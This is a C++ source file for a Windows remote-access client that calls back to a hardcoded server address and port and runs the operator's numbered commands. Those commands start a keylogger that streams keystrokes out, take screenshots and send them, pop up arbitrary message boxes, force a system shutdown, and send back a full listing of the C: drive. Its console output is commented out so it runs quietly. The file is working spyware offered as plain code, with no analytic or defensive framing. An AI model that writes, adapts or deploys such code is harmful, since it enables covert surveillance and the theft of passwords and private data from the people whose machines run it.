#include <iostream> //input/output
#include <winsock2.h> // socket objects
#include <thread> // threading
#include <cstdlib> // For exit()
#include <string> //string type
#include <atomic>
#include <fstream>
#include <windows.h>
#include <unistd.h>
#pragma comment(lib, "ws2_32.lib") // Link Winsock library

using namespace std;

const char *SERVER_IP = "192.168.1.108"; 
const int PORT = 2222; 

atomic<int> state = 0;

int initSock() {
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
      //  cout << "WSAStartup failed with error: " << iResult << endl;
        return 1;
    }
    return 0;
}

void screenShot(const char* fileName, int clientSocket) {
    // Screen capture code
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    BITMAPFILEHEADER bfHeader = {0};
    BITMAPINFOHEADER biHeader = {0};
    bfHeader.bfType = 0x4D42; // 'BM'
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfHeader.bfSize = bfHeader.bfOffBits + width * height * 4;
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biWidth = width;
    biHeader.biHeight = -height; // Negative height for top-down DIB
    biHeader.biPlanes = 1;
    biHeader.biBitCount = 32;
    biHeader.biCompression = BI_RGB;

    // Write to file
    ofstream file(fileName, ios::binary);
    if (!file.is_open()) {
       //cerr << "Could not open BMP file for writing: " << fileName << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return;
    }

    BYTE* bitmapData = new BYTE[width * height * 4];
    GetDIBits(hMemoryDC, hBitmap, 0, height, bitmapData, (BITMAPINFO*)&biHeader, DIB_RGB_COLORS);
    file.write((char*)&bfHeader, sizeof(bfHeader));
    file.write((char*)&biHeader, sizeof(biHeader));
    file.write((char*)bitmapData, width * height * 4);
    file.close();

    // Reopen for sending
    ifstream infile(fileName, ios::binary);
    if (!infile.is_open()) {
    //  cerr << "Could not open BMP file for reading: " << fileName << std::endl;
        delete[] bitmapData;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return;
    }

    // Get file size
    infile.seekg(0, ios::end);
    size_t fileSize = infile.tellg();
    infile.seekg(0, ios::beg);
    send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);

    // Send file data
    char buffer[1024];
    while (infile.read(buffer, sizeof(buffer))) {
        send(clientSocket, buffer, infile.gcount(), 0);
    }
    if (infile.gcount() > 0) {
        send(clientSocket, buffer, infile.gcount(), 0);
    }
    // Cleanup
    infile.close();
    delete[] bitmapData;
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}

void messageBox(int clientSocket) {
    while (state == 2) {
        char buffer[1024] = {0};
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            string message(buffer, bytesReceived);
            if (message == "back") {
                state = 0;
                break;
            }
            wstring wideMessage(message.begin(), message.end());
            MessageBoxW(NULL, wideMessage.c_str(), L"Message", MB_OK);
        }
    }
}

void keylogging(int clientSocket) {
    while(state == 1) {
        for(int i = 0; i < 255; i++) {
            if(GetAsyncKeyState(i) & 0x8000) {
                char reformed = static_cast<char>(i);
                if (reformed == VK_SHIFT) {
                    send(clientSocket, "{SHIFT}", strlen("{SHIFT}"), 0);
                }
                else if (reformed == VK_RETURN) {
                    send(clientSocket, "{RETURN}", strlen("{RETURN}"), 0);
                }
                else if (reformed == VK_BACK) {
                    send(clientSocket, "{BACK}", strlen("{BACK}"), 0);
                }
                else if (reformed == VK_SPACE) {
                    send(clientSocket, "{SPACE}", strlen("{SPACE}"), 0);
                }
                else {
                    send(clientSocket, &reformed, sizeof(reformed),0);
                }
            }
        }
        this_thread::sleep_for(chrono::milliseconds(100)); 
    }
}

void receiveMessage(int clientSocket) {
    while(true) {
  //      cout << "State is: " << state << endl;
        char buffer[1024] = {0};
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        string message = string(buffer, bytesReceived);
        if (bytesReceived > 0) {
            if(message == "1") {
                state = 1; 
                thread keyloggerThread(keylogging, clientSocket);
                keyloggerThread.detach();
            }else if(message == "2") {
                state = 2;
                thread messageBoxThread(messageBox, clientSocket);
                messageBoxThread.detach();
            }else if(message == "3") {
                    thread screenShotThread(screenShot,"screenshot.bmp", clientSocket);
                    //screenShot("screenshot.bmp",clientSocket);
                    screenShotThread.detach(); 
                    Sleep(1000); 
            }else if (message == "4") {
                system("shutdown /s /t 0");
            } else if (message == "5") {
                dup2(clientSocket, 1);
                dup2(clientSocket, 2);
            
                FILE *fp = popen("tree C:\\ /F /A", "r"); // Open command for reading output
                char output[1024];
                while (fgets(output, sizeof(output), fp)) { 
                    send(clientSocket, output, strlen(output), 0); // Send output line by line
                }
                pclose(fp);
                // Send a termination message to mark the end of output
                send(clientSocket, "EOF", 3, 0);
            }
        }
    }
}

int CsocketHandle() {
    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
    //    cout << "Socket creation failed with error: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    serverAddress.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(clientSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
    //    cout << "Connection failed with error: " << WSAGetLastError() << endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

   // cout << "Connected to server!" << endl;

    thread receiveKeylogger(receiveMessage,clientSocket);
 //   thread sendMessage(sendM,clientSocket);

    receiveKeylogger.join();
 //   sendMessage.join();

    closesocket(clientSocket);
  //  cout << "Disconnected from server." << endl;
    
    WSACleanup();
    return 0;

}
int main() {
    initSock();
    CsocketHandle();
}